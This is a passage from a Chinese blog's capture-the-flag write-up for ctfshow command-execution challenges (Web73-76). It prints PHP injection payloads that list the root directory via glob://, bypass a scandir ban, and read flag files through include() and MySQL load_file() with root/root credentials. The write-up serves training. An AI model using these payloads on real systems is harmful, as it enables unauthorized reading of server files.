<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>
<p>​		突然发现 include 读取文件又可以了，直接读：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">indlude</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<h1 id="web74"><a class="markdownIt-Anchor" href="#web74">#</a> Web74：</h1>
<p>​		这一题 ban 了 scandir，那就直接 glob 绕过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>
<p>​		之后 include 去读。</p>
<h1 id="web75"><a class="markdownIt-Anchor" href="#web75">#</a> Web75：</h1>
<p>​		glob 读根目录结构：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>
<p>​		多次测试，发现无法读取文件，可以试着利用 mysql 去读取文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<p>​		简单解释一下这个 payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 使用PDO（PHP Data Objects）创建一个新的数据库连接对象，指定DSN、用户名（root）和密码（root）</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行一个SQL查询，从指定的文件（/flag36.txt）中读取内容</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">        <span class="comment">// 输出读取到的内容，并追加一个竖线（|）</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将数据库连接对象设置为null，关闭连接</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果发生PDO异常，输出错误信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    <span class="comment">// 终止脚本执行</span></span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<h1 id="web76"><a class="markdownIt-Anchor" href="#web76">#</a> Web76：</h1>
<p>​		还是 glob 读文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>
<p>​		还是老样子，MySQL 读文件一把梭：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<h1 id="一些总结文章"><a class="markdownIt-Anchor" href="#一些总结文章">#</a> 一些总结文章：</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzE1OTU3L2FydGljbGUvZGV0YWlscy8xMTg4NTU4NjU/b3BzX3JlcXVlc3RfbWlzYz0mYW1wO3JlcXVlc3RfaWQ9JmFtcDtiaXpfaWQ9MTAyJmFtcDt1dG1fdGVybT1saW51eCVFNSU4RiU5NiVFNSU4RiU4RCVFNSU5MSVCRCVFNCVCQiVBNHJjZSVFOCU4NCU5QSVFNiU5QyVBQyZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+c29iYWlkdXdlYn5kZWZhdWx0LTEtMTE4ODU1ODY1LjE0MiU1RXYxMDAlNUVwY19zZWFyY2hfcmVzdWx0X2Jhc2U2JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==">总结 rce（远程代码执行各种 sao 姿势）绕过 bypass</span></p>

      <div class="tags">
          <a href="/tags/Web/" rel="tag"><i class="ic i-tag"></i> Web</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2024-09-17 14:11:14" itemprop="dateModified" datetime="2024-09-17T14:11:14+08:00">2024-09-17</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="g01den 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="g01den 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://blog.g01den.top/posts/53e2b2e1.html" title="ctfshow-命令执行">http://blog.g01den.top/posts/53e2b2e1.html</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/posts/97a7dff3.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture315.jpg" title="ctfshow-信息搜集">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
  <h3>ctfshow-信息搜集</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/posts/4fb535d6.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;12&#x2F;09&#x2F;vLoWKQMUB7eNaJq.jpg" title="ctfshow-反序列化">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
  <h3>ctfshow-反序列化</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web29"><span class="toc-number">1.</span> <span class="toc-text"> Web29：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web30"><span class="toc-number">2.</span> <span class="toc-text"> Web30：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web31"><span class="toc-number">3.</span> <span class="toc-text"> Web31：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web32"><span class="toc-number">4.</span> <span class="toc-text"> Web32：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web33"><span class="toc-number">5.</span> <span class="toc-text"> Web33：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web34"><span class="toc-number">6.</span> <span class="toc-text"> Web34：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web35"><span class="toc-number">7.</span> <span class="toc-text"> Web35：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web36"><span class="toc-number">8.</span> <span class="toc-text"> Web36：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web37"><span class="toc-number">9.</span> <span class="toc-text"> Web37：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web38"><span class="toc-number">10.</span> <span class="toc-text"> Web38：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web39"><span class="toc-number">11.</span> <span class="toc-text"> Web39：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web40"><span class="toc-number">12.</span> <span class="toc-text"> Web40：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web41"><span class="toc-number">13.</span> <span class="toc-text"> Web41：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web42"><span class="toc-number">14.</span> <span class="toc-text"> Web42：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web43"><span class="toc-number">15.</span> <span class="toc-text"> Web43：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web44"><span class="toc-number">16.</span> <span class="toc-text"> Web44：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web45"><span class="toc-number">17.</span> <span class="toc-text"> Web45：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web46"><span class="toc-number">18.</span> <span class="toc-text"> Web46：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web47"><span class="toc-number">19.</span> <span class="toc-text"> Web47：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web48"><span class="toc-number">20.</span> <span class="toc-text"> Web48：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web49"><span class="toc-number">21.</span> <span class="toc-text"> Web49：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web50"><span class="toc-number">22.</span> <span class="toc-text"> Web50：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web51"><span class="toc-number">23.</span> <span class="toc-text"> Web51：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web52"><span class="toc-number">24.</span> <span class="toc-text"> Web52：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web53"><span class="toc-number">25.</span> <span class="toc-text"> Web53：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web54"><span class="toc-number">26.</span> <span class="toc-text"> Web54：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web55"><span class="toc-number">27.</span> <span class="toc-text"> Web55：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web56"><span class="toc-number">28.</span> <span class="toc-text"> Web56：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web57"><span class="toc-number">29.</span> <span class="toc-text"> Web57：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web58"><span class="toc-number">30.</span> <span class="toc-text"> Web58：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web59"><span class="toc-number">31.</span> <span class="toc-text"> Web59：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web60"><span class="toc-number">32.</span> <span class="toc-text"> Web60：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web61"><span class="toc-number">33.</span> <span class="toc-text"> Web61：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web62"><span class="toc-number">34.</span> <span class="toc-text"> Web62：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web63"><span class="toc-number">35.</span> <span class="toc-text"> Web63：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web64"><span class="toc-number">36.</span> <span class="toc-text"> Web64：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web65"><span class="toc-number">37.</span> <span class="toc-text"> Web65：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web66"><span class="toc-number">38.</span> <span class="toc-text"> Web66：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web67"><span class="toc-number">39.</span> <span class="toc-text"> Web67：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web68"><span class="toc-number">40.</span> <span class="toc-text"> Web68：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web69"><span class="toc-number">41.</span> <span class="toc-text"> Web69：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web70"><span class="toc-number">42.</span> <span class="toc-text"> Web70：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web71"><span class="toc-number">43.</span> <span class="toc-text"> Web71：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web72"><span class="toc-number">44.</span> <span class="toc-text"> Web72：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web73"><span class="toc-number">45.</span> <span class="toc-text"> Web73：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web74"><span class="toc-number">46.</span> <span class="toc-text"> Web74：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web75"><span class="toc-number">47.</span> <span class="toc-text"> Web75：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web76"><span class="toc-number">48.</span> <span class="toc-text"> Web76：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%E6%96%87%E7%AB%A0"><span class="toc-number">49.</span> <span class="toc-text"> 一些总结文章：</span></a></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/posts/384200ef.html" rel="bookmark" title="SQL无列名注入">SQL无列名注入</a></li><li><a href="/posts/88915f6f.html" rel="bookmark" title="无参数RCE的一些奇技淫巧">无参数RCE的一些奇技淫巧</a></li><li><a href="/posts/2f610211.html" rel="bookmark" title="反弹shell">反弹shell</a></li><li><a href="/posts/97a7dff3.html" rel="bookmark" title="ctfshow-信息搜集">ctfshow-信息搜集</a></li><li class="active"><a href="/posts/53e2b2e1.html" rel="bookmark" title="ctfshow-命令执行">ctfshow-命令执行</a></li><li><a href="/posts/4fb535d6.html" rel="bookmark" title="ctfshow-反序列化">ctfshow-反序列化</a></li><li><a href="/posts/b856856d.html" rel="bookmark" title="ctfshow-ssrf">ctfshow-ssrf</a></li><li><a href="/posts/ad175165.html" rel="bookmark" title="ctfshow-文件包含">ctfshow-文件包含</a></li><li><a href="/posts/4826d2ce.html" rel="bookmark" title="ctfshow-SSTI">ctfshow-SSTI</a></li><li><a href="/posts/b3ad4123.html" rel="bookmark" title="有小考点的Web题">有小考点的Web题</a></li><li><a href="/posts/ff5b88d5.html" rel="bookmark" title="python原型链污染">python原型链污染</a></li><li><a href="/posts/2d792864.html" rel="bookmark" title="Python栈帧逃逸">Python栈帧逃逸</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="g01den"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">g01den</p>
  <div class="description" itemprop="description">golden的部落阁</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">50</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">10</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/posts/97a7dff3.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/posts/4fb535d6.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
</div>

    <span><a href="/posts/cf99ed43.html" title="从NSSCTF开始的复建之路">从NSSCTF开始的复建之路</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/d7e2e20f.html" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/b3ad4123.html" title="有小考点的Web题">有小考点的Web题</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/b856856d.html" title="ctfshow-ssrf">ctfshow-ssrf</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
</div>

    <span><a href="/posts/7232a36b.html" title="小小的总结（日常发癫）">小小的总结（日常发癫）</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/2d792864.html" title="Python栈帧逃逸">Python栈帧逃逸</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/53e2b2e1.html" title="ctfshow-命令执行">ctfshow-命令执行</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/52965aaa.html" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/c2860616.html" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
</div>

    <span><a href="/posts/3fe30769.html" title="一、Servlet和JSP技术概述">一、Servlet和JSP技术概述</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: 'posts/53e2b2e1.html',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
</html>
